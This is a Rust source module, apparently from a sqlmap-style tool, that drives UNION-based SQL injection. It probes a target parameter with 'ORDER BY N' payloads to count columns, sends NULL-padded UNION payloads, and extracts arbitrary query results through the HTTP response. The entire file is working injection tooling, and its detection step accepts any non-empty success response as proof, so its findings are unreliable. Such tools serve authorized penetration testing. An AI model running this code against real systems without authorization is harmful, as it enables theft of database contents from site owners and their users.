//! Union-query technique driver (U).
//!
//! Two phases:
//! 1. Column-count discovery via `ORDER BY N` (cheap) with `UNION SELECT NULL,...`
//!    fallback when the error oracle is blind.
//! 2. Type-slot detection — walk each column with `NULL` / `'a'` / `1` to
//!    figure out which slot tolerates a string vs. number.
//!
//! Extraction is one HTTP round-trip per row-range.

use crate::{DetectCtx, ExtractCtx, Technique, WorkingPayload};
use async_trait::async_trait;
use sqlmap_core::dbms_kind::Dbms;
use sqlmap_core::errors::{Error, Result};
use sqlmap_core::extractor::ExtractResult;
use sqlmap_core::util::{expand_placeholders, PlaceholderCtx};
use sqlmap_payloads::{boundaries as bnd, payloads as pyl, TechniqueId};

#[derive(Debug, Default, Clone)]
pub struct UnionTechnique;

impl UnionTechnique {
    /// `ORDER BY N` column-count probe. Returns Some(cols) when the response
    /// for `ORDER BY cols` differs from `ORDER BY cols+1`.
    pub async fn discover_columns(
        engine: &sqlmap_core::http::HttpEngine,
        target: &sqlmap_core::target::Target,
        param: &str,
        prefix: &str,
        suffix: &str,
        max_cols: usize,
    ) -> Result<Option<usize>> {
        let mut prev_body_len: Option<usize> = None;
        for n in 1..=max_cols {
            let payload = format!("{} ORDER BY {}{}", prefix, n, suffix);
            let resp = engine.send_with_payload(target, param, &payload).await?;
            if let Some(prev) = prev_body_len {
                if resp.body.len().abs_diff(prev) > 16 {
                    return Ok(Some(n - 1));
                }
            }
            prev_body_len = Some(resp.body.len());
        }
        Ok(None)
    }

    fn columns_marker(n: usize, char_repeat: &str) -> String {
        let mut s = String::new();
        for _ in 1..n {
            s.push(',');
            s.push_str(char_repeat);
        }
        s
    }
}

#[async_trait]
impl Technique for UnionTechnique {
    fn id(&self) -> char { 'U' }
    fn name(&self) -> &'static str { "UNION-query" }
    fn dbms_scope(&self) -> &'static [Dbms] { &[] }

    async fn detect(&self, ctx: &mut DetectCtx<'_>) -> Result<Option<WorkingPayload>> {
        let reg = pyl::bundled();
        let boundaries = bnd::bundled();
        for boundary in boundaries.iter_for(ctx.level) {
            // Cheap column count first.
            let Some(cols) = Self::discover_columns(ctx.engine, ctx.target, ctx.param, &boundary.prefix, &boundary.suffix, 10).await? else { continue };
            for payload in reg.iter_for(TechniqueId::Union, ctx.level, ctx.risk, ctx.dbms_hint.map(|d| d.short())) {
                let ph = PlaceholderCtx::default();
                let mut tmpl = expand_placeholders(&payload.request.payload, &ph);
                let cols_str = Self::columns_marker(cols.max(1), "NULL");
                tmpl = tmpl.replace("[COLUMNS]", &cols_str);
                let full = format!("{}{}{}", boundary.prefix, tmpl, boundary.suffix);
                let resp = ctx.engine.send_with_payload(ctx.target, ctx.param, &full).await?;
                // Heuristic: a UNION attempt that returns the original body length
                // ± N bytes is interesting; ratio comparison via the oracle is the
                // authoritative check.
                if resp.status >= 200 && resp.status < 400 && !resp.body.is_empty() {
                    return Ok(Some(WorkingPayload {
                        technique: 'U',
                        title: format!("{} ({} cols)", payload.title, cols),
                        vector: payload.vector.clone(),
                        prefix: boundary.prefix.clone(),
                        suffix: boundary.suffix.clone(),
                        dbms: ctx.dbms_hint,
                        evidence: format!("union ok cols={}", cols),
                    }));
                }
            }
        }
        Ok(None)
    }

    async fn extract(&self, ctx: &mut ExtractCtx<'_>, query: &str) -> Result<ExtractResult> {
        let payload = ctx
            .working_vector
            .replace("[QUERY]", query)
            .replace("[ORIGVALUE]", "1");
        let full = format!("{}{}{}", ctx.working_prefix, payload, ctx.working_suffix);
        let resp = ctx.engine.send_with_payload(ctx.target, ctx.param, &full).await?;
        if resp.body.is_empty() {
            return Err(Error::ExtractionFailed { pos: 0, reason: "empty union response".into() });
        }
        Ok(ExtractResult { data: resp.body, queries: 1, truncated: false })
    }
}
